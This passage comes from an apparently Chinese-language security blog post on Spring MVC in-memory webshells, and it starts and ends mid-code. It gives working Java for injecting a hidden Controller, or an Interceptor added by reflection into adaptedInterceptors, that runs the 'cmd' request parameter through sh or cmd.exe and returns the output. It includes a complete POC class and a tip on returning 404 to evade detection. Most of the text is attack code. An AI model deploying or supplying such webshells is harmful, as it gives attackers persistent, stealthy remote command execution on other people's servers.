        <span class="n">RequestMappingInfo</span> <span class="n">info</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RequestMappingInfo</span><span class="o">(</span><span class="n">url</span><span class="o">,</span> <span class="n">condition</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>

        <span class="n">InjectedController</span> <span class="n">injectedController</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InjectedController</span><span class="o">();</span>

        <span class="n">requestMappingHandlerMapping</span><span class="o">.</span><span class="na">registerMapping</span><span class="o">(</span><span class="n">info</span><span class="o">,</span> <span class="n">injectedController</span><span class="o">,</span> <span class="n">method</span><span class="o">);</span>

        <span class="k">return</span> <span class="s">"Inject done"</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="nd">@RestController</span>
    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">InjectedController</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="nf">InjectedController</span><span class="o">(){</span>
        <span class="o">}</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">cmd</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
            <span class="n">HttpServletRequest</span> <span class="n">request</span> <span class="o">=</span> <span class="o">((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span> <span class="o">(</span><span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">())).</span><span class="na">getRequest</span><span class="o">();</span>
            <span class="n">HttpServletResponse</span> <span class="n">response</span> <span class="o">=</span> <span class="o">((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span> <span class="o">(</span><span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">())).</span><span class="na">getResponse</span><span class="o">();</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="kt">boolean</span> <span class="n">isLinux</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
                <span class="n">String</span> <span class="n">osTyp</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"os.name"</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">osTyp</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">osTyp</span><span class="o">.</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"win"</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">isLinux</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
                <span class="o">}</span>
                <span class="n">String</span><span class="o">[]</span> <span class="n">cmds</span> <span class="o">=</span> <span class="n">isLinux</span> <span class="o">?</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"sh"</span><span class="o">,</span> <span class="s">"-c"</span><span class="o">,</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)}</span> <span class="o">:</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"cmd.exe"</span><span class="o">,</span> <span class="s">"/c"</span><span class="o">,</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)};</span>
                <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmds</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
                <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">"\\A"</span><span class="o">);</span>
                <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">""</span><span class="o">;</span>
                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">flush</span><span class="o">();</span>
                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">close</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>先访问Inject进行controller注册。然后访问controller映射路径evilcontroller，带上参数就能RCE</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172138-2dd1d45a-957f-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172141-2fcfb786-957f-1.png"/></p>
<p>除此以外，还有两种方式能模拟注册Controller</p>
<p>②detectHandlerMethods直接注册</p>
<p>上面指出：在detectHandlerMethods中，用getMappingForMethod创建RequestMappingInfo</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172152-36993ff6-957f-1.png"/></p>
<p>该方法接收handler参数，就能寻找到bean并注册controller</p>
<div class="highlight"><pre><span></span><span class="c1">//1.在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span>
<span class="n">context</span><span class="o">.</span><span class="na">getBeanFactory</span><span class="o">().</span><span class="na">registerSingleton</span><span class="o">(</span><span class="s">"dynamicController"</span><span class="o">,</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.example.springmvc.InjectedController"</span><span class="o">).</span><span class="na">newInstance</span><span class="o">());</span>
<span class="c1">// 2. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span>
<span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">mvc</span><span class="o">.</span><span class="na">method</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">RequestMappingHandlerMapping</span> <span class="n">requestMappingHandlerMapping</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">mvc</span><span class="o">.</span><span class="na">method</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
<span class="c1">// 3. 反射获得 detectHandlerMethods Method</span>
<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">m1</span> <span class="o">=</span> <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMethodMapping</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"detectHandlerMethods"</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
<span class="n">m1</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="c1">//4.将 dynamicController 注册到 handlerMap 中</span>
<span class="n">m1</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">requestMappingHandlerMapping</span><span class="o">,</span> <span class="s">"dynamicController"</span><span class="o">);</span>
</pre></div>
<p>③利用registerHandler</p>
<p>上面的方法适用于spring3.1后RequestMappingHandlerMapping为映射器。当用DefaultAnnotationHandlerMapping为映射器时。该类顶层父类的registerHandler接收urlPath参数和handler参数来注册controller。不过不常用了，贴一下利用方法：</p>
<div class="highlight"><pre><span></span><span class="c1">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span>
<span class="n">context</span><span class="o">.</span><span class="na">getBeanFactory</span><span class="o">().</span><span class="na">registerSingleton</span><span class="o">(</span><span class="s">"dynamicController"</span><span class="o">,</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.example.springmvc.InjectedController"</span><span class="o">).</span><span class="na">newInstance</span><span class="o">());</span>
<span class="c1">// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean</span>
<span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">mvc</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">DefaultAnnotationHandlerMapping</span>  <span class="n">dh</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">mvc</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">DefaultAnnotationHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
<span class="c1">// 3. 反射获得 registerHandler Method</span>
<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">m1</span> <span class="o">=</span> <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractUrlHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"registerHandler"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
<span class="n">m1</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="c1">// 4. 将 dynamicController 和 URL 注册到 handlerMap 中</span>
<span class="n">m1</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">dh</span><span class="o">,</span> <span class="s">"/favicon"</span><span class="o">,</span> <span class="s">"dynamicController"</span><span class="o">);</span>
</pre></div>
<p>还可以加个else不带参数时返回404状态码，减少被检测到的概率</p>
<h2 data-content="1" id="a1ce6541658519d4d9c56dd6ff1aef44">Interceptor拦截器内存马构造</h2>
<p>Interceptor和Tomcat和Filter过滤器很类似。区别如下：</p>
<ol>
<li>Interceptor基于反射，Filter基于函数回调</li>
<li>Interceptor不依赖servlet容器</li>
<li>Interceptor只能对action请求有用</li>
<li>Interceptor可以访问action上下文，栈里的对象。Filter不能</li>
<li>action生命周期中，Interceptor可以被多次调用，Filter只在容器初始化时调用一次</li>
<li>Interceptor可以获取IOC容器中的bean，Filter不行</li>
</ol>
<p>由以上区别，Interceptor的应用和过滤器也就不同，Interceptor用来做日志记录，过滤器用来过滤非法操作</p>
<h4 data-content="1" id="db84d5987e97fc1301af0582b7109ecc">源码分析</h4>
<p>DispatcherServlet.doDispatch中，进行了getHandler，持续跟进发现最终调用的是AbstractHandlerMapping#getHandler()，该方法中调用了getHandlerExecutionChain()</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172204-3d64c710-957f-1.png"/></p>
<p>该方法从adaptedInterceptors中把符合的拦截器添加到chain里。adaptedInterceptors就存放了全部拦截器</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172208-3ff70f38-957f-1.png"/></p>
<p>返回到DispatcherServlet#doDispatch()，getHandler后执行了applyPreHandle遍历执行了拦截器。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172211-41f1e092-957f-1.png"/></p>
<p>而且可以看到applyPreHandle后面就是ha.handle()，执行controller，所以说Interceptors是在controller之前执行的</p>
<p>师傅给出了Filter,controller,Interceptors执行的顺序：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172217-4513f44a-957f-1.png"/></p>
<ul>
<li>preHandle( )：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。</li>
<li>postHandle( )：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。</li>
<li>afterCompletion( )：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。</li>
</ul>
<h3 data-content="1" id="15e502255c923cf79f916036656831dd">1. 获取RequestMappingHandlerMapping</h3>
<p>因为是在AbstractHandlerMapping类中，用addInterceptor向拦截器chain中添加的。该类是抽象类，可以获取其实现类RequestMappingHandlerMapping。一样的，前面提了四种方法。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172221-47d0c262-957f-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebApplicationContext</span><span class="o">)</span> <span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>

<span class="n">RequestMappingHandlerMapping</span> <span class="n">mappingHandlerMapping</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</pre></div>
<h3 data-content="1" id="db72aebc89c2c7dd225db6a5f5f51b0a">2.反射获取adaptedInterceptors</h3>
<p>获取adaptedInterceptors，private属性，使用反射。并且传入RequestMappingHandlerMapping初始化</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172226-4a77b462-957f-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="n">field</span> <span class="o">=</span> <span class="n">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"adaptedInterceptors"</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
    <span class="n">List</span><span class="o">&lt;</span><span class="n">HandlerInterceptor</span><span class="o">&gt;</span> <span class="n">adaptInterceptors</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="n">adaptInterceptors</span> <span class="o">=</span> <span class="o">(</span><span class="n">List</span><span class="o">&lt;</span><span class="n">HandlerInterceptor</span><span class="o">&gt;)</span> <span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">mappingHandlerMapping</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
    <span class="o">}</span>
</pre></div>
<h3 data-content="1" id="6069627e20bb738d0905ebdc60660887">3.添加恶意Interceptors</h3>
<div class="highlight"><pre><span></span><span class="n">adaptInterceptors</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="n">InjectEvilInterceptor</span><span class="o">(</span><span class="s">"a"</span><span class="o">));</span>
</pre></div>
<p>恶意Interceptor:需要实现HandlerInterceptor接口，通过重写preHandle进行RCE</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">InjectInterceptor</span> <span class="kd">implements</span> <span class="n">HandlerInterceptor</span> <span class="o">{</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">preHandle</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">try</span><span class="o">{</span>
                <span class="kt">boolean</span> <span class="n">isLinux</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
                <span class="n">String</span> <span class="n">osTyp</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"os.name"</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">osTyp</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">osTyp</span><span class="o">.</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"win"</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">isLinux</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
                <span class="o">}</span>
                <span class="n">String</span><span class="o">[]</span> <span class="n">cmds</span> <span class="o">=</span> <span class="n">isLinux</span> <span class="o">?</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"sh"</span><span class="o">,</span> <span class="s">"-c"</span><span class="o">,</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)}</span> <span class="o">:</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"cmd.exe"</span><span class="o">,</span> <span class="s">"/c"</span><span class="o">,</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)};</span>
                <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmds</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
                <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">"\\A"</span><span class="o">);</span>
                <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">""</span><span class="o">;</span>
                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">flush</span><span class="o">();</span>
                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">close</span><span class="o">();</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="o">}</span>
            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">postHandle</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">,</span> <span class="n">ModelAndView</span> <span class="n">modelAndView</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">HandlerInterceptor</span><span class="o">.</span><span class="na">super</span><span class="o">.</span><span class="na">postHandle</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">,</span> <span class="n">handler</span><span class="o">,</span> <span class="n">modelAndView</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">afterCompletion</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">,</span> <span class="n">Exception</span> <span class="n">ex</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">HandlerInterceptor</span><span class="o">.</span><span class="na">super</span><span class="o">.</span><span class="na">afterCompletion</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">,</span> <span class="n">handler</span><span class="o">,</span> <span class="n">ex</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<h3 data-content="1" id="b4e0e2489040fab3258220bccd18aaac">测试：</h3>
<p>过滤器和controller可以直接使用@RequestMapping注解进行URL映射。拦截器Interceptor需要手动编写一个Config添加进去，或者直接修改配置文件spingmvc.xml</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;mvc:interceptors&gt;</span>
        <span class="nt">&lt;mvc:interceptor&gt;</span>
            <span class="nt">&lt;mvc:mapping</span> <span class="na">path=</span><span class="s">"/**"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;bean</span> <span class="na">class=</span><span class="s">"org.example.InjectInterceptor"</span><span class="nt">&gt;&lt;/bean&gt;</span>
        <span class="nt">&lt;/mvc:interceptor&gt;</span>
    <span class="nt">&lt;/mvc:interceptors&gt;</span>
</pre></div>
<p>POC：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example.springmvc</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.springframework.web.context.WebApplicationContext</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.HandlerInterceptor</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.ModelAndView</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.handler.AbstractHandlerMapping</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.List</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">InjectInterceptor</span> <span class="kd">implements</span> <span class="n">HandlerInterceptor</span> <span class="o">{</span>
    <span class="kd">static</span> <span class="o">{</span>
        <span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebApplicationContext</span><span class="o">)</span> <span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
        <span class="n">RequestMappingHandlerMapping</span> <span class="n">mappingHandlerMapping</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">field</span> <span class="o">=</span> <span class="n">AbstractHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"adaptedInterceptors"</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">List</span><span class="o">&lt;</span><span class="n">HandlerInterceptor</span><span class="o">&gt;</span> <span class="n">adaptInterceptors</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">adaptInterceptors</span> <span class="o">=</span> <span class="o">(</span><span class="n">List</span><span class="o">&lt;</span><span class="n">HandlerInterceptor</span><span class="o">&gt;)</span> <span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">mappingHandlerMapping</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
        <span class="n">InjectInterceptor</span> <span class="n">evilInterceptor</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InjectInterceptor</span><span class="o">();</span>
        <span class="n">adaptInterceptors</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">evilInterceptor</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">preHandle</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">try</span><span class="o">{</span>
                <span class="kt">boolean</span> <span class="n">isLinux</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
                <span class="n">String</span> <span class="n">osTyp</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"os.name"</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">osTyp</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">osTyp</span><span class="o">.</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"win"</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">isLinux</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
                <span class="o">}</span>
                <span class="n">String</span><span class="o">[]</span> <span class="n">cmds</span> <span class="o">=</span> <span class="n">isLinux</span> <span class="o">?</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"sh"</span><span class="o">,</span> <span class="s">"-c"</span><span class="o">,</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)}</span> <span class="o">:</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"cmd.exe"</span><span class="o">,</span> <span class="s">"/c"</span><span class="o">,</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)};</span>
                <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmds</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
